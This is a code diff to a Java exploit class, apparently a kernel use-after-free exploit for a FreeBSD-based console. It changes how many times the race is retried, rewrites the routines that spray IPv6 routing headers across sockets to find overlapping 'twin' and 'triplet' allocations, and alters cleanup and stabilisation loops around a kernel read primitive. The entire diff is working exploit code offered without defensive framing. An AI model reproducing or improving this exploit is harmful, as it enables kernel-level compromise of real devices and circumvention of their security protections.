@@ -21,7 +21,7 @@ public class Poops {
     private static final int IOV_SIZE = 0x10;
 
     private static final int IPV6_SOCK_NUM = 200;
-	private static final int TWIN_TRIES   = 25000;
+	private static final int TWIN_TRIES   = 4;
 	private static final int UAF_TRIES    = 80000;
     private static final int KQUEUE_TRIES = 300000;
     private static final int IOV_THREAD_NUM = 4;
@@ -211,60 +211,39 @@ public class Poops {
         return cpuset_setaffinity(3, 1, 0xFFFFFFFFFFFFFFFFL, 0x10, mask);
     }
 
-	private static void adaptive_yield(int count) {
-    for (int i = 0; i < count; i++) {
-        sched_yield();
-        }
-    }
-
-    private static void nanosleep_fun(int nsec) {
-        int safe = nsec;
-        if (safe < 30) safe = 30;
-        if (safe > 100000) safe = 100000;
-        try { Thread.sleep(safe / 1000000); } catch (Exception ignored) {}
-    }
-
-    private static void hard_reset_globals() {
-        twins = new int[2];
-        triplets = new int[3];
-        successfulSockets.clear();
-        uafSock = -1;
-        kq_fdp = 0;
-        kl_lock = 0;
-        fdt_ofiles = 0;
-        allproc = 0;
-    }
-
     private static int cpuset_setaffinity(int level, int which, long id, long setsize, Buffer mask) {
         return (int)api.call(cpuset_setaffinity, level, which, id, setsize, mask != null ? mask.address() : 0);
     }
 
     public static void cleanup() {
-        for (int i = 0; i < successfulSockets.size(); i++) {
-            try {
-                close(((Integer) successfulSockets.get(i)).intValue());
-            } catch (Exception ignored) {}
+        for (int i = 0; i < ipv6Socks.length; i++) {
+            close(ipv6Socks[i]);
         }
-        successfulSockets.clear();
-        for (int i = 0; i < ipv6Socks.length; i++) try { close(ipv6Socks[i]); } catch (Exception ignored) {}
-        try { close(uioSs1); close(uioSs0); close(iovSs1); close(iovSs0); } catch (Exception ignored) {}
+        close(uioSs1);
+        close(uioSs0);
+        close(iovSs1);
+        close(iovSs0);
         for (int i = 0; i < IOV_THREAD_NUM; i++) {
             if (iovThreads[i] != null) {
                 iovThreads[i].interrupt();
-                try { iovThreads[i].join(300); } catch (Exception ignored) {}
+                try {
+                    iovThreads[i].join();
+                } catch (Exception e) {}
             }
         }
         for (int i = 0; i < UIO_THREAD_NUM; i++) {
             if (uioThreads[i] != null) {
                 uioThreads[i].interrupt();
-                try { uioThreads[i].join(300); } catch (Exception ignored) {}
+                try {
+                    uioThreads[i].join(500);
+                } catch (Exception e) {}
             }
         }
-        if (previousCore >= 0) {
+        if (previousCore >= 0 && previousCore != 4) {
+            //console.println("back to core " + previousCore);
             Helper.pinToCore(previousCore);
             previousCore = -1;
         }
-        hard_reset_globals();
     }
 
     private static int buildRthdr(Buffer buf, int size) {
@@ -423,8 +402,7 @@ public class Poops {
     }
 
     public static boolean performSetup() {
-        hard_reset_globals();
-		try {
+        try {
             api = API.getInstance();
 
             dup = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "dup");
@@ -471,7 +449,6 @@ public class Poops {
                 console.println("failed to pin to core");
                 return false;
             }
-			if (cpusetSetAffinity(4) != 0) return false;
 
             if (!Helper.setRealtimePriority(256)) {
                 console.println("failed realtime priority");
@@ -531,57 +508,102 @@ public class Poops {
         }
     }
 
-	private static boolean findTwins(int timeout) {
-		while (timeout-- != 0) {
-			// Spray phase
-			for (int i = 0; i < ipv6Socks.length; i++) {
-				sprayRthdr.putInt(0x04, RTHDR_TAG | i);
-				setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
-			}
-			try { Thread.sleep(1); } catch (Exception ignored) {}   // ← TAMBAHAN INI
-			sched_yield();
+private static boolean findTwins() {
+    int max_attempts = 4;   // sa
 
-			// Check phase
-			for (int i = 0; i < ipv6Socks.length; i++) {
-				leakRthdrLen.set(Int64.SIZE);
-				getRthdr(ipv6Socks[i], leakRthdr, leakRthdrLen);
-				int val = leakRthdr.getInt(0x04);
-				int j = val & 0xFFFF;
-				if ((val & 0xFFFF0000) == RTHDR_TAG && i != j) {
-					twins[0] = i;
-					twins[1] = j;
-					return true;
-				}
-			}
-			try { Thread.sleep(1); } catch (Exception ignored) {}   // ← TAMBAHAN INI (opsional tapi bagus)
-			sched_yield();
-		}
-		return false;
-	}
+    for (int attempt = 0; attempt < max_attempts; attempt++) {
+        console.println("Twins attempt " + (attempt + 1) + "/" + max_attempts);
 
-	private static int findTriplet(int master, int other, int timeout) {
-		while (timeout-- != 0) {
-			for (int i = 0; i < ipv6Socks.length; i++) {
-				if (i == master || i == other) continue;
-				sprayRthdr.putInt(0x04, RTHDR_TAG | i);
-				setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
-			}
-			try { Thread.sleep(1); } catch (Exception ignored) {}   // ← TAMBAHAN
+        // Full reset sebelum spray
+        for (int i = 0; i < ipv6Socks.length; i++) {
+            freeRthdr(ipv6Socks[i]);
+        }
 
-			for (int i = 0; i < ipv6Socks.length; i++) {
-				if (i == master || i == other) continue;
-				leakRthdrLen.set(Int64.SIZE);
-				getRthdr(ipv6Socks[master], leakRthdr, leakRthdrLen);
-				int val = leakRthdr.getInt(0x04);
-				int j = val & 0xFFFF;
-				if ((val & 0xFFFF0000) == RTHDR_TAG && j != master && j != other) {
-					return j;
-				}
-			}
-			try { Thread.sleep(1); } catch (Exception ignored) {}   // ← TAMBAHAN
-		}
-		return -1;
-	}
+        try { 
+            Thread.sleep(1); 
+        } catch (Exception ignored) {}
+
+        // Spray phase
+        for (int i = 0; i < ipv6Socks.length; i++) {
+            sprayRthdr.putInt(0x04, RTHDR_TAG | i);
+            setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
+        }
+
+        try { 
+            Thread.sleep(1); 
+        } catch (Exception ignored) {}
+
+        // Search phase
+        for (int i = 0; i < ipv6Socks.length; i++) {
+            leakRthdrLen.set(Int64.SIZE);
+            getRthdr(ipv6Socks[i], leakRthdr, leakRthdrLen);
+
+            int val = leakRthdr.getInt(0x04);
+            int j = val & 0xFFFF;
+            int tag = val & 0xFFFF0000;
+
+            if (tag == RTHDR_TAG && i != j && j < ipv6Socks.length) {
+                twins[0] = i;
+                twins[1] = j;
+                console.println("Twins founded");
+                return true;
+            }
+        }
+
+        console.println("No twins on attempt " + (attempt + 1) + ", retrying...");
+        try { 
+            Thread.sleep(2); 
+        } catch (Exception ignored) {}
+    }
+
+    console.println("FindTwins failed after " + max_attempts + " attempts");
+    return false;
+}
+
+private static int findTriplet(int master, int other, int timeout) {
+    while (timeout-- != 0) {
+        // Spray phase (kecuali master dan other)
+        for (int i = 0; i < ipv6Socks.length; i++) {
+            if (i == master || i == other) continue;
+            sprayRthdr.putInt(0x04, RTHDR_TAG | i);
+            setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
+        }
+
+        try { Thread.sleep(1); } catch (Exception ignored) {}
+
+        // Forward search
+        leakRthdrLen.set(Int64.SIZE);
+        getRthdr(ipv6Socks[master], leakRthdr, leakRthdrLen);
+        int val = leakRthdr.getInt(0x04);
+        int j = val & 0xFFFF;
+        int tag = val & 0xFFFF0000;
+
+        if (tag == RTHDR_TAG && j != master && j != other && j < ipv6Socks.length) {
+            // console.println("Triplet founded");
+            return j;
+        }
+
+        // Reverse search
+        for (int i = 0; i < ipv6Socks.length; i++) {
+            if (i == master || i == other) continue;
+            leakRthdrLen.set(Int64.SIZE);
+            getRthdr(ipv6Socks[i], leakRthdr, leakRthdrLen);
+            val = leakRthdr.getInt(0x04);
+            int j2 = val & 0xFFFF;
+            tag = val & 0xFFFF0000;
+
+            if (tag == RTHDR_TAG && j2 == master) {
+                // console.println("Triplet founded");
+                return i;
+            }
+        }
+
+        try { Thread.sleep(1); } catch (Exception ignored) {}
+    }
+
+    console.println("FindTriplet failed");
+    return -1;
+}
 
     private static long kreadSlow64(long address) {
         return kreadSlow(address, Int64.SIZE).getLong(0x00);
@@ -854,11 +876,10 @@ public class Poops {
             clearBuf.putInt(0x00, uafSock);
             __sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());
 
-            sched_yield();
-			// Stabilisasi loop
+            // Stabilisasi loop
             for (int i = 0; i < 32; i++) {
                 iovState.signalWork(0);
-                // sched_yield();
+                sched_yield();
                 try { Thread.sleep(1); } catch (Exception ignored) {}
                 write(iovSs1, tmp, Int8.SIZE);
                 iovState.waitForFinished();
@@ -866,9 +887,8 @@ public class Poops {
             }
 
             close(dup(uafSock));
-			sched_yield();
 
-            if (!findTwins(TWIN_TRIES)) {
+            if (!findTwins()) {
                 console.println("findTwins failed");
                 return false;
             }
@@ -894,7 +914,7 @@ public class Poops {
                 return false;
             }
 
-			triplets[0] = twins[0];
+            triplets[0] = twins[0];
             close(dup(uafSock));
 
             sched_yield();
